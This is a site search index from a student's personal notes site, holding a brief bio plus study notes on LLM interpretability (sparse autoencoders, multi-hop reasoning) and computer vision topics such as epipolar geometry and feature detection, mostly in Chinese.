{"config":{"lang":["en"],"separator":"[\\s\\u200b\\-]","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"Yixuan Zheng      Student at Peking University     Focusing on Machine Learning, LLMs, and Model Interpretability.    \ud83d\udc4b Self-Introduction  <p>I'm currently an undergraduate student at School of Electronics Engineering and Computer Science, Peking University, majoring in Information and Computing Science.</p> \ud83c\udf93 Education Experience <li>2025.09 - now Undergraduate in Information and Computing Science | School of Electronics Engineering and Computer Science, Peking University </li> <li>2024.09 - 2025.07 Undergraduate in Theoretical and Applied Mechanics | College of Engineering, Peking University </li> \ud83c\udfc6 Awards &amp; Honors <li>2024-2025 Merit Student of Peking University (\u200b\u5317\u4eac\u5927\u5b66\u200b\u4e09\u597d\u5b66\u751f\u200b)     </li> <li>2024-2025 Huatai Science and Technology Scholarship (\u200b\u534e\u6cf0\u200b\u8bc1\u5238\u200b\u79d1\u6280\u200b\u5956\u5b66\u91d1\u200b)     </li>"},{"location":"lectures/Opening%20the%20Black%20Box/","title":"Opening the Black Box","text":"<p>Understanding the Mechanism of   LLMs  </p> <p>Lecturer: Liangming Pan, Zijun Yao, Jiaran Ye</p>"},{"location":"lectures/Opening%20the%20Black%20Box/#part-1-an-introduction-to-science-of-llm","title":"Part 1. An Introduction to Science of LLM","text":"<p>\"\u200b\u957f\u200b\u601d\u8003\u200b\"\u200b\u63a8\u7406\u6a21\u578b\u200b \u200b\u5bf9\u200b\u5176\u200b\u673a\u7406\u200b\u8ba4\u8bc6\u200b\u4e0d\u8db3\u200b\u2014\u2014\u200b\u9ed1\u76d2\u200b</p> <p>Open questions: - How is knowledge stored and retrieved in LLMs? - How do models perform complex reasoning internally? - Why does simple next-token prediction training lead to emergent abilities? - What benefits do RL training bring to the LLMs?</p> <p>LLMs represent the first \"intelligent agents\" that We can fully observe and manipulate</p> <p>Philosophy\u2014\u2014Bottom-up (Reductionism) / Top-Down(Systems theory) Methodology\u2014\u2014Reverse Engineering(\u200b\u6839\u636e\u200b\u5927\u200b\u6a21\u578b\u200b\u7684\u200b\u50a8\u5b58\u200b\u5f97\u5230\u200b\u5b83\u200b\u8868\u793a\u200b\u7684\u200b\u6982\u5ff5\u200b) / Concept Based Interpretability(\u200b\u7ed9\u5b9a\u200b\u6982\u5ff5\u200b\uff0c\u200b\u5bfb\u627e\u200b\u5927\u200b\u6a21\u578b\u200b\u662f\u200b\u5982\u4f55\u200b\u50a8\u5b58\u200b\u8fd9\u79cd\u200b\u6982\u5ff5\u200b\u7684\u200b) Techniques\u2014\u2014Neuron Attribution Circuit Finding Sparse Autoencoder... / Concept Probing Synthesizing Data Behavioral Science...</p> <p>\u200b\u7c7b\u6bd4\u200b\u4eba\u8111\u200b\u7814\u7a76\u200b\u2014\u2014\u200b\u5927\u8111\u200b\u5bf9\u5e94\u200b...\uff0c\u200b\u5c0f\u8111\u200b\u5bf9\u5e94\u200b\u63a7\u5236\u200b...\uff0c\u200b\u5bfb\u627e\u200b\u5927\u200b\u6a21\u578b\u200b\u6bcf\u4e2a\u200b\u90e8\u5206\u200b\u7684\u200b\u5bf9\u5e94\u200b</p> <p>Example of Reverse Engineering</p> <p>Specific Component -&gt; Interpret weights / activations</p> <ol> <li>identify features</li> <li>describe process</li> </ol> <p></p> <p>Polysemanticity Porblem</p> <p>There are far more features in the world than MLP neurons     -&gt; Superposition: models must represent more concepts than they have neurons</p> <p>Sparse Auto-Encoder</p> <p>Key idea: decompose model activations into sparsely active components(\"features\"), which turn out in many cases to correspond to human-interpretable concepts.</p> <p>Cross-Layer Transcoder</p> <p>Key idea: Building an Interpretable Replacement Model</p> <p>An example of multi-step reasoning Dallas-&gt;Texas-&gt;Austin \u200b\u901a\u8fc7\u200b feature \u200b\u53d1\u73b0\u200b\u5927\u200b\u6a21\u578b\u200b\u7684\u200b\u63a8\u7406\u200b\u8fc7\u7a0b\u200b</p> <p>Limitation - SAE reconstruction errors are too high - An approximate explanation is not a true explanation. - SAE method are expensive to apply to large models - The features we find might not be the features we want</p> <p>Dilemma: We are trying to explain a black box and then to interpret it Quesition: Why not build a \"glass-box\" at first?</p>"},{"location":"lectures/Opening%20the%20Black%20Box/#part-2-sparse-auto-encoder-sae","title":"Part 2. Sparse Auto-Encoder (SAE)","text":"<p>\u200b\u627e\u5230\u200b\u6a21\u578b\u200b\u5b8c\u6210\u200b\u4e00\u4e2a\u200b\u529f\u80fd\u200b\u7684\u200b\u6700\u5c0f\u200b\u5355\u5143\u200b\u662f\u200b\u4ec0\u4e48\u200b\u2014\u2014(\u200b\u7ec6\u80de\u200b)</p> <p>\u200b\u81ea\u7136\u8bed\u8a00\u200b\u5bf9\u200b\u7279\u5f81\u200b\u7684\u200b\u63cf\u8ff0\u200b\u662f\u200b\u7a00\u758f\u200b\u7684\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u4f1a\u200b\u63cf\u8ff0\u200b\u4e00\u4e2a\u200b\u7269\u4ef6\u200b\u7684\u200b\u5168\u90e8\u200b\u7279\u5f81\u200b\u3002\u200b\u5bfc\u81f4\u200b\u8bad\u7ec3\u200b\u51fa\u6765\u200b\u7684\u200b\u6a21\u578b\u200b\u5177\u6709\u200b\u4e25\u91cd\u200b\u7684\u200b\u591a\u91cd\u200b\u8bed\u4e49\u200b\u6027\u200b\u3002\u200b\u4e00\u4e2a\u200b Neuro \u200b\u9700\u8981\u200b\u8868\u793a\u200b\u591a\u4e2a\u200b\u7279\u5f81\u200b</p> <p>How to resolve superposition</p> <p>Dictionary Learning as Sparse Autoencoder</p> <p>LLM -&gt;(Train an SAE) SAE -&gt; (Model Reconstruction) LLM</p> <p>\u200b\u8981\u6c42\u200b\u89e3\u7801\u200b\u540e\u200b\u7684\u200b LLM \u200b\u548c\u200b\u7f16\u7801\u200b\u524d\u200b\u7684\u200b LLM identical $$     z=SparseConstraint(W_{enc}(x)) $$</p> <p>\u200b\u4ec0\u4e48\u6837\u200b\u7684\u200b\u5927\u200b\u6a21\u578b\u200b\u662f\u200b\u66f4\u597d\u200b\u7684\u200b\uff1a Sacling Law of LLMs: Model Size + Training Data -&gt; Training FLOPs \uff08\u200b\u6d6e\u70b9\u200b\u64cd\u4f5c\u6570\u200b\uff09-&gt; Model Performance \u200b\u89c2\u5bdf\u200b\u8ba1\u7b97\u200b\u91cf\u200b\u4e0e\u200b\u6700\u540e\u200b Loss \u200b\u4e4b\u95f4\u200b\u7684\u200b\u66f2\u7ebf\u200b\u5173\u7cfb\u200b</p> <p>What Can SAE DO:  Assessing Interpretability of Features Extracted by SAEs</p> <p>Applications: SAE interprets Linguistic Features</p> <p>Model Steering with SAES - Causality is the essence of any kind of science - Mechanistic Interpretability aims to build the science of LLM \u200b\u627e\u5230\u200b\u76f8\u5173\u6027\u200b-&gt; \u200b\u901a\u8fc7\u200b\u5e72\u9884\u200b\u5b9e\u9a8c\u200b\u8bc1\u660e\u200b\u56e0\u679c\u6027\u200b SAEs Are Good for Steering - If You Select the Right Features - Select features with steering objectives</p> <p>Concerns about SAEs - Faithfulness - Too much computation - Too much storage</p> <p>Furture Directions of OpenSAE - Automatic Feature Interpretation - Further Sacling up OpenSAE with More Training Tokens and Larger Model Sacle - Post-Train Sparse Autoencoder for Better Steering</p>"},{"location":"lectures/Opening%20the%20Black%20Box/#part-3-how-does-transformer-learn-implicit-reasoning","title":"Part 3. How does Transformer Learn Implicit Reasoning","text":"<p> \u200b\u6a21\u578b\u200b\u505a\u200b\u591a\u200b\u8df3\u200b\u63a8\u7406\u200b\u7684\u200b\u7ed3\u679c\u200b\u5e76\u200b\u4e0d\u200b\u4e0e\u200b\u6211\u4eec\u200b\u8bbe\u60f3\u200b\u4e00\u81f4\u200b\u2014\u2014\u200b\u5bf9\u200b\u9996\u76f8\u200b\u77e5\u8bc6\u200b\u8fdb\u884c\u200b\u7f16\u8f91\u200b\uff0c\u200b\u4f46\u662f\u200b\u8be2\u95ee\u200b\u9996\u76f8\u200b\u7684\u200b\u59bb\u5b50\u200b\u56de\u7b54\u200b\u4ecd\u7136\u200b\u4e00\u6837\u200b\u3002</p> <p>It's hard to tell whether the model is reasoning - or just taking shortcuts.</p> <p>Unverified premise 1: Model executes reasoning by combinating single knowledges. Unverified premise 2: Decodability reflects the model's internal reasoning.</p> <p>Controlled Environment for our Analysis - Atomic Triples   (e1, r1) -&gt; e2 - 2-hop Queries   (e1, r1, r2) -&gt; e3</p> <p></p> <p>Finding: ID triples are not necessary for ID generalization</p>"},{"location":"notes/Computer%20Vision/Camera%20Calibration/","title":"Camera Calibration","text":""},{"location":"notes/Computer%20Vision/Camera%20Calibration/#problem","title":"Problem","text":"<ul> <li>Given \\(n\\) points with known 3D coordinates \\(X_i\\) and known image projections \\(x_i\\), estimate the camera parameters. </li> </ul>"},{"location":"notes/Computer%20Vision/Camera%20Calibration/#how-to-get-parameters","title":"How to get parameters","text":"<p>\u200b\u901a\u8fc7\u200b\u6700\u5c0f\u5316\u200b \\(||Ap||\\) \u200b\u6211\u4eec\u200b\u5f97\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u8fd1\u4f3c\u200b \\(K[R|t]\\) \u200b\u7684\u200b\u77e9\u9635\u200b. \u200b\u5982\u4f55\u200b\u4ece\u4e2d\u200b\u5f97\u5230\u200b \\(K,R,t\\) ?</p> <p>Key observation: \\(K\\) is a upper triangular matrix, \\(R\\) is a orthonormal matrix</p> <p>We can perform \\(\\text{RQ}\\) decomposition to get \\(K,R,t\\)</p> <p></p>"},{"location":"notes/Computer%20Vision/Camera%20Calibration/#triangulation","title":"Triangulation","text":"<p>\u200b\u5f97\u5230\u200b\u4e86\u200b\u4e24\u5f20\u200b\u56fe\u200b\u7684\u200b\u5bf9\u5e94\u70b9\u200b\u540e\u200b, \u200b\u5982\u4f55\u200b\u91cd\u5efa\u200b\u4e09\u7ef4\u200b\u5750\u6807\u200b:</p> <p>\u200b\u76f4\u63a5\u200b\u901a\u8fc7\u200b\u8fde\u7ebf\u200b\u76f8\u4ea4\u200b\u7684\u200b\u65b9\u5f0f\u200b, \u200b\u7531\u4e8e\u200b\u566a\u97f3\u200b\u7684\u200b\u5b58\u5728\u200b, \u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u53ef\u4ee5\u200b\u76f8\u4ea4\u200b\u4e8e\u540c\u200b\u4e00\u70b9\u200b.</p> <p></p> <p></p> <p> </p>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/","title":"Epipolar Geometry","text":""},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#three-configuration","title":"Three Configuration","text":"<ul> <li>Convergine Cameras: \u200b\u57fa\u7ebf\u200b\u4e0e\u200b\u6210\u50cf\u200b\u5e73\u9762\u200b\u4e0d\u200b\u5e73\u884c\u200b, \u200b\u6781\u70b9\u200b\u6709\u9650\u200b, \u200b\u6781\u70b9\u200b\u6709\u200b\u53ef\u80fd\u200b\u5728\u200b\u6210\u50cf\u200b\u5e73\u9762\u200b\u4e0a\u200b\u53ef\u89c1\u200b\u4e5f\u200b\u6709\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u53ef\u89c1\u200b. </li> <li>Parrallel to Image Plane: \u200b\u6210\u50cf\u200b\u5e73\u9762\u200b\u548c\u200b\u57fa\u7ebf\u200b\u5e73\u884c\u200b, \u200b\u6781\u70b9\u200b\u5728\u200b\u65e0\u7a77\u200b\u8fdc\u5904\u200b, \u200b\u6781\u7ebf\u200b\u5e73\u884c\u200b\u4e8e\u200b\u57fa\u7ebf\u200b. </li> <li>Motion Perpendicular to the image plane: \u200b\u57fa\u7ebf\u200b\u548c\u200b\u6210\u50cf\u200b\u5e73\u9762\u200b\u5782\u76f4\u200b, \u200b\u6210\u50cf\u200b\u5e73\u9762\u200b\u5e73\u884c\u200b, \u200b\u6781\u70b9\u200b\u5373\u200b\u76f8\u673a\u200b\u5e73\u9762\u200b\u4e3b\u200b\u70b9\u200b </li> </ul>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#essential-matrix-fundamental-matrix","title":"Essential Matrix &amp; Fundamental Matrix","text":"<p>Warning</p> <p>\u200b\u5373\u4f7f\u200b\u4e00\u7ec4\u200b\u70b9\u200b\u5bf9\u200b\u6ee1\u8db3\u200b\u4e86\u200b\u5bf9\u200b\u6781\u200b\u7ea6\u675f\u200b, \u200b\u5e76\u200b\u4e0d\u200b\u610f\u5473\u7740\u200b\u5b83\u4eec\u200b\u5c31\u662f\u200b\u76f8\u540c\u200b\u7684\u200b 3D \u200b\u70b9\u200b\u5728\u200b\u5404\u4e2a\u200b\u6210\u50cf\u200b\u5e73\u9762\u200b\u7684\u200b\u6295\u5f71\u200b.</p>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#calibrated-case","title":"Calibrated Case","text":"<p>Suppose camera intrinsic parameters are known, and the world coordinate system is set to that of the first camera.</p> <p>The Projection matrices are:</p> \\[ K[I|O] ,K'[R|t] \\] <p>Therefore, we can multiply the projection matrices and the image points by inverse calibration matrices to get normalized image coordinates</p> \\[ x=K^{-1}x_{pixel} \\cong [I|O]X  \\] \\[ x'=K'^{-1}x_{pixel}' \\cong [R|t]X \\] <p></p> <p>\u200b\u6ce8\u610f\u200b\u5230\u200b\u53c9\u200b\u4e58\u200b\u53ef\u4ee5\u200b\u7528\u200b\u77e9\u9635\u200b\u8868\u793a\u200b:</p> \\[ t_{\\times}=\\begin{bmatrix} 0 &amp; -t_3 &amp; t_2 \\\\ t_3 &amp; 0 &amp; -t_1 \\\\ -t_2 &amp; t_1 &amp; 0 \\end{bmatrix} \\] <p>\u200b\u4e8e\u662f\u200b\u6761\u4ef6\u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u8f6c\u5316\u200b:</p> <p></p> <p>E \u200b\u77e9\u9635\u200b\u5c31\u662f\u200b \\(t_{\\times}R\\)</p> <p>\u200b\u6ce8\u610f\u200b\u5230\u200b\u4e00\u4e2a\u4e09\u7ef4\u200b\u5411\u91cf\u200b\u5c31\u200b\u4ee3\u8868\u200b\u4e86\u200b\u4e09\u7ef4\u200b\u5e73\u9762\u200b\u4e0a\u200b\u7684\u200b\u4e00\u6761\u200b\u76f4\u7ebf\u200b \\(ax+by+c=0\\), \\(Ex\\) \u200b\u5c31\u662f\u200b \\(x\\) \u200b\u5728\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5e73\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6781\u7ebf\u200b, \\(E^T x'\\) \u200b\u5c31\u662f\u200b \\(x'\\) \u200b\u5728\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u5e73\u9762\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6781\u7ebf\u200b.</p> <p></p> <p>E \u200b\u7684\u200b\u79e9\u4e3a\u200b 2, \u200b\u6709\u200b 5 \u200b\u4e2a\u200b\u81ea\u7531\u5ea6\u200b. (3\u200b\u65cb\u8f6c\u200b+3\u200b\u5e73\u79fb\u200b-scaling ambiguity)</p>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#uncalibrated-case","title":"Uncalibrated Case","text":"<p>If \\(K,K'\\) is unknown, then the constraint is:</p> \\[ x_{pixel}'^TFx_{pixel}=0 \\] <p>where</p> \\[ F=K'^{-T}EK^{-1} \\] <p>which is called the fundamental matrix.</p> <p></p> <p></p>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#rank-2-constraint","title":"Rank-2 Constraint","text":"<p>\u200b\u5229\u7528\u200b Eight-Point Algorithm \u200b\u6c42\u51fa\u200b\u7684\u200b f \u200b\u53ea\u200b\u6ee1\u8db3\u200b\u4e86\u200b \\(||f||=1\\), \u200b\u6211\u4eec\u200b\u8fd8\u200b\u9700\u8981\u200b\u6ee1\u8db3\u200b \\(\\text{rank}(f)=2\\)</p> <p>\u200b\u4f4e\u200b\u79e9\u200b\u8fd1\u4f3c\u200b: SVD \u200b\u5206\u89e3\u200b, \u200b\u5c06\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b\u5947\u5f02\u200b\u503c\u7f6e\u200b\u4e3a\u200b 0.</p>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#normalized-eight-point-algorithm","title":"Normalized Eight-Point Algorithm","text":"<p>\u200b\u6ce8\u610f\u200b\u5230\u200b x, x' \u200b\u662f\u200b\u50cf\u7d20\u200b\u5750\u6807\u200b, \u200b\u4e58\u8d77\u6765\u200b\u6709\u200b \\(10^6\\) \u200b\u91cf\u7ea7\u200b, \u200b\u800c\u200b\u516b\u70b9\u200b\u7b97\u6cd5\u200b\u7684\u200b \\(U\\) \u200b\u77e9\u9635\u200b\u4e2d\u200b\u6700\u5c0f\u200b\u7684\u200b\u53ea\u6709\u200b 1.</p> <p></p> <p>\u200b\u56e0\u6b64\u200b, \u200b\u5728\u200b\u6bcf\u5f20\u200b\u7167\u7247\u200b\u4e2d\u200b\u6211\u4eec\u200b\u90fd\u200b\u5c06\u200b\u5176\u200b\u4e2d\u5fc3\u200b\u5e73\u79fb\u200b\u81f3\u200b\u539f\u70b9\u200b\u5e76\u4e14\u200b scale \u200b\u4f7f\u5f97\u200b\u5747\u65b9\u200b\u8ddd\u79bb\u200b\u4e3a\u200b 2pixels. \u200b\u5047\u8bbe\u200b normalize \u200b\u53d8\u6362\u200b\u77e9\u9635\u200b\u5206\u522b\u200b\u4e3a\u200b \\(T,T'\\)</p> <p>\u200b\u5219\u200b </p> <p>$$ \\begin{align} x_{normal} &amp;=Tx_{pixel}\\ x'{normal} &amp;=T'x'\\ x'^T_{normal}F_{normal}&amp;x_{normal}=0\\ x'{pixel}T'^TF=0}&amp;Tx_{pixel</p> <p>\\end{align} $$</p> <p>\u200b\u6bd4\u8f83\u200b\u53ef\u77e5\u200b</p> \\[ F=T'^TF_{normal}T \\]"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#nonlinear-method","title":"Nonlinear method","text":""},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#applications-of-the-essential-matrix","title":"Applications of the Essential Matrix","text":""},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#decompose-rt-from-an-essential-matrix","title":"Decompose R,t from an Essential Matrix","text":"<p>\u200b\u4ee4\u200b \\(\\hat{t}\\) \u200b\u4ee3\u8868\u200b \\(t\\) \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u5355\u4f4d\u5411\u91cf\u200b, \\([\\hat{t}]_{\\times}\\) \u200b\u4f5c\u7528\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5411\u91cf\u200b\u4e0a\u200b\u4f1a\u200b\u4f7f\u5f97\u200b\u5b83\u200b \\(t\\) \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u5206\u91cf\u200b\u7f6e\u200b\u4e3a\u200b 0, \u200b\u6b63\u4ea4\u200b\u5e73\u9762\u200b\u4e0a\u200b\u7684\u200b\u5411\u91cf\u200b\u65cb\u8f6c\u200b \\(90\\degree\\), \u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5199\u6210\u200b:</p> \\[ [\\hat{t}]_{\\times}=SZR_{90\\degree}S^T= \\begin{bmatrix} s_0 &amp; s_1 &amp; \\hat{t} \\end{bmatrix} \\begin{bmatrix} 1 &amp;  &amp; \\\\ &amp; 1 &amp; \\\\ &amp; &amp; 0 \\end{bmatrix} \\begin{bmatrix} 0 &amp; -1 &amp; \\\\ 1&amp; 0 &amp; \\\\ &amp; &amp; 1 \\end{bmatrix} \\begin{bmatrix} s_0^T \\\\ s_1^T\\\\ \\hat{t}^T \\end{bmatrix} \\] <p>\u200b\u5176\u4e2d\u200b \\(s_0,s_1,\\hat{t}\\) \u200b\u4e3a\u200b\u6807\u51c6\u200b\u6b63\u4ea4\u200b\u57fa\u200b.</p>"},{"location":"notes/Computer%20Vision/Epipolar%20Geometry/#recall","title":"Recall \u200b\u57fa\u200b\u53d8\u6362","text":"<p>\u200b\u5047\u8bbe\u200b\u539f\u57fa\u200b\u4e3a\u200b \\([e_0, e_1, e_2]\\) , \u200b\u65b0\u57fa\u4e3a\u200b \\([f_0,f_1,f_2]\\) </p> <p>\u200b\u65b0\u57fa\u200b\u5728\u200b\u539f\u6765\u200b\u7684\u200b\u57fa\u200b\u5411\u91cf\u200b\u7684\u200b\u5750\u6807\u200b\u4e3a\u200b \\(x_0,x_1,x_2\\), \u200b\u5373\u200b:</p> \\[ [f_0,f_1,f_2]=[e_0,e_1,e_2][x_0|x_1|x_2] \\] <p>\u200b\u5047\u8bbe\u200b\u539f\u6765\u200b\u67d0\u4e2a\u200b\u5411\u91cf\u200b \\(a\\) \u200b\u5728\u200b\u539f\u6765\u200b\u57fa\u200b\u5411\u91cf\u200b\u4e0b\u200b\u7684\u200b\u5750\u6807\u200b\u662f\u200b \\(\\boldsymbol{x}\\), \u200b\u5728\u200b\u65b0\u200b\u57fa\u4e0b\u200b\u7684\u200b\u5750\u6807\u200b\u662f\u200b \\(\\boldsymbol{y}\\)</p> \\[ \\begin{align} a&amp;=[e_0,e_1,e_2]\\boldsymbol{x}\\\\  &amp;=[f_0,f_1,f_2][x_0|x_1|x_2]^{-1}\\boldsymbol{x}\\\\  &amp;=[f_0,f_1,f_2]\\boldsymbol{y} \\end{align} \\] <p>\u200b\u56e0\u6b64\u200b </p> \\[ \\boldsymbol{y}=[x_0|x_1|x_2]^{-1}\\boldsymbol{x} \\] <p>\u200b\u7531\u4e8e\u200b \\(Z\\) \u200b\u5c31\u662f\u200b \\([\\hat{t}]_{\\times}\\) \u200b\u7684\u200b\u5947\u5f02\u200b\u503c\u200b\u77e9\u9635\u200b (\u200b\u4e0d\u96be\u200b\u6ce8\u610f\u200b\u5230\u200b\u8be5\u200b\u77e9\u9635\u200b\u7684\u200b\u4e24\u4e2a\u200b\u5947\u5f02\u200b\u503c\u200b\u90fd\u200b\u662f\u200b 1, \u200b\u53ef\u4ee5\u200b\u7528\u53c9\u200b\u4e58\u200b\u7684\u200b\u51e0\u4f55\u200b\u610f\u4e49\u200b\u60f3\u8c61\u200b.)</p> <p>\u200b\u5bf9\u200b \\(E\\) \u200b\u8fdb\u884c\u200b\u5947\u5f02\u200b\u503c\u200b\u5206\u89e3\u200b</p> \\[ E=SZR_{90\\degree}S^TR=U\\Sigma V^T \\] <p>\u200b\u7531\u4e8e\u200b \\(Z=\\Sigma\\), \u200b\u6bd4\u8f83\u200b\u53ef\u77e5\u200b \\(S=U, R=UR_{90\\degree}^TV^T\\) </p> <p>\u200b\u7531\u4e8e\u200b\u7b26\u53f7\u200b\u7b49\u200b\u95ee\u9898\u200b, \u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6bd4\u8f83\u200b\u4e00\u4e0b\u200b 4 \u200b\u7ec4\u89e3\u200b, \u200b\u770b\u200b\u54ea\u200b\u4e00\u7ec4\u200b\u66f4\u200b\u5408\u7406\u200b.</p> <p> </p> <p>\u200b\u6b63\u8d1f\u53f7\u200b: \u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b (++, --)</p> <p>\\(s_0,s_1\\) \u200b\u4ea4\u6362\u200b: \u200b\u4e24\u79cd\u200b\u60c5\u51b5\u200b (\\([s_0,s_1],[s_1,s_0]\\), \u200b\u5bfc\u81f4\u200b\u65cb\u8f6c\u200b \\(90, -90\\))</p> <p>\u200b\u4e00\u5171\u200b\u56db\u7ec4\u200b\u89e3\u200b</p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/","title":"Feature Detection","text":""},{"location":"notes/Computer%20Vision/Feature%20Detection/#edge-detection","title":"Edge Detection","text":""},{"location":"notes/Computer%20Vision/Feature%20Detection/#sobel","title":"Sobel","text":"<p>Remember to smooth the image before edge detection, otherwise the noise would affect the result.</p> <p>Notice that:</p> \\[ \\frac{d}{dx}(f*g)=f*\\frac{d}{dx}g \\] <p>so we can apply gaussian derivative kernel on the image.</p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/#image-gradient-magnitutde","title":"Image Gradient Magnitutde","text":"\\[ ||\\nabla f||=\\sqrt{(\\frac{\\partial f}{\\partial x})^2+(\\frac{\\partial f}{\\partial y})^2} \\]"},{"location":"notes/Computer%20Vision/Feature%20Detection/#non-maximum-suppresion","title":"Non-Maximum Suppresion","text":"<p>\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b gradient magnitude \u200b\u4ea7\u751f\u200b\u7684\u200b\u8fb9\u7f18\u200b\u8fc7\u539a\u200b, \u200b\u6211\u4eec\u200b\u91c7\u7528\u200b\u5982\u4e0b\u200b\u65b9\u5f0f\u200b\u5c06\u200b\u5176\u200b\u53d8\u7ec6\u200b: \u200b\u5bf9\u4e8e\u200b\u6bcf\u4e2a\u200b\u70b9\u200b, \u200b\u53ea\u200b\u4fdd\u7559\u200b\u8fb9\u200b\u7684\u200b\u65b9\u5411\u200b\u4e0a\u200b\u68af\u5ea6\u200b\u5e45\u503c\u200b\u6700\u5927\u200b\u7684\u200b\u70b9\u200b. </p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/#double-threshold","title":"Double Threshold","text":"<p>&gt; 0.7 \u200b\u8ba4\u4e3a\u200b\u662f\u200b\u8fb9\u7f18\u200b &lt; 0.3 \u200b\u8ba4\u4e3a\u200b\u4e0d\u662f\u200b\u8fb9\u7f18\u200b \u200b\u4e2d\u95f4\u200b\u8ba4\u4e3a\u200b\u662f\u200b \u200b\u5f31\u8fb9\u200b.</p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/#edge-tracking-by-hysteresis","title":"Edge Tracking by Hysteresis","text":"<p>Weak edges that are connected to strong edges will be actual/real edges.</p> <p>Weak edges that are not connected to strong edges will be removed</p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/#corners","title":"Corners","text":""},{"location":"notes/Computer%20Vision/Feature%20Detection/#harris-corner-detector","title":"Harris Corner Detector","text":"<p>\u200b\u6838\u5fc3\u200b\u89c2\u5bdf\u200b: \u200b\u8003\u8651\u200b\u4e00\u4e2a\u200b\u7a97\u53e3\u200b\u5185\u200b\u7684\u200b\u50cf\u7d20\u200b, \u200b\u89d2\u70b9\u200b\u4f4d\u7f6e\u200b\u7a97\u53e3\u200b\u5728\u200b\u5404\u4e2a\u200b\u65b9\u5411\u200b\u79fb\u52a8\u200b\u540e\u200b\u50cf\u7d20\u200b\u503c\u5747\u200b\u6709\u200b\u5f88\u5927\u200b\u53d8\u5316\u200b.</p> <p></p> <p></p> <p>Use Taylor Series to simplify the calculation</p> <p></p> <p>M \u200b\u7684\u200b\u7279\u5f81\u503c\u200b\u53cd\u6620\u200b\u4e86\u200b E \u200b\u5728\u200b\u5404\u4e2a\u200b\u65b9\u5411\u200b\u7684\u200b\u53d8\u5316\u200b\u5e45\u5ea6\u200b</p> <p></p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/#properties-of-corners","title":"Properties of Corners","text":"<ul> <li>equivariant with translation and rotation</li> <li>partially invariant to affine intensity changes</li> <li>Corners are not equivariant with scaling</li> </ul> <p>how to make it equivariant with scaling? -- Gaussian Pyramids!</p> <p></p>"},{"location":"notes/Computer%20Vision/Feature%20Detection/#blobs","title":"Blobs","text":"<p>Blobs are regions in a digital image that differ in properties, such as brightness or color, compared to surrounding regions.</p> <p>Blobs have fixed positions and sizes, can be localized, and are good interest points.</p> <p></p>"},{"location":"notes/Computer%20Vision/Image%20Processing/","title":"Image Processing","text":""},{"location":"notes/Computer%20Vision/Image%20Processing/#1-gaussian-pyramid","title":"1. Gaussian Pyramid","text":"<p>\u200b\u6bcf\u200b\u4e00\u5c42\u200b\u5148\u200b\u505a\u200b Gauss filter \u200b\u7136\u540e\u200b\u8fdb\u884c\u200b\u4e0b\u200b\u91c7\u6837\u200b, \u200b\u7f13\u89e3\u200b\u76f4\u63a5\u200b\u4e0b\u200b\u91c7\u6837\u200b\u5bfc\u81f4\u200b\u7684\u200b\u8d70\u6837\u200b\u73b0\u8c61\u200b(\u200b\u539f\u200b\u56fe\u50cf\u200b\u7684\u200b\u9ad8\u9891\u200b\u90e8\u5206\u200b\u7528\u200b\u4f4e\u9891\u200b\u4fe1\u53f7\u200b\u6355\u83b7\u200b\u5c31\u200b\u4f1a\u200b\u4ea7\u751f\u200b\u8d70\u6837\u200b).</p>"},{"location":"notes/Computer%20Vision/Image%20Processing/#2-laplacian-pyramid","title":"2. Laplacian Pyramid","text":""},{"location":"notes/Computer%20Vision/Image%20Processing/#motivation","title":"motivation","text":"<p>\u200b\u9ad8\u65af\u200b\u91d1\u5b57\u5854\u200b\u5728\u200b\u4e0b\u200b\u91c7\u6837\u200b\u7684\u200b\u65f6\u5019\u200b\u4e22\u5931\u200b\u4e86\u200b\u9ad8\u9891\u200b\u7684\u200b\u4fe1\u606f\u200b, \u200b\u4e3a\u4e86\u200b\u8fd8\u539f\u200b\u5b83\u4eec\u200b, \u200b\u6211\u4eec\u200b\u8981\u200b\u4fdd\u5b58\u200b\u88ab\u200b\u8fc7\u6ee4\u200b\u6389\u200b\u7684\u200b\u4fe1\u606f\u200b.</p>"},{"location":"notes/Computer%20Vision/Image%20Processing/#structure","title":"structure","text":"<p>\u200b\u9996\u5148\u200b\u6784\u5efa\u200b\u9ad8\u65af\u200b\u91d1\u5b57\u5854\u200b \\(G_0,G_1,...\\)</p> <p>\u200b\u7531\u4e8e\u200b \\(G_{i+1}\\) \u200b\u662f\u200b\u76f8\u5f53\u4e8e\u200b \\(G_i\\) \u200b\u5148\u200b\u6a21\u7cca\u200b\u518d\u4e0b\u200b\u91c7\u6837\u200b\u7684\u200b\u7ed3\u679c\u200b, 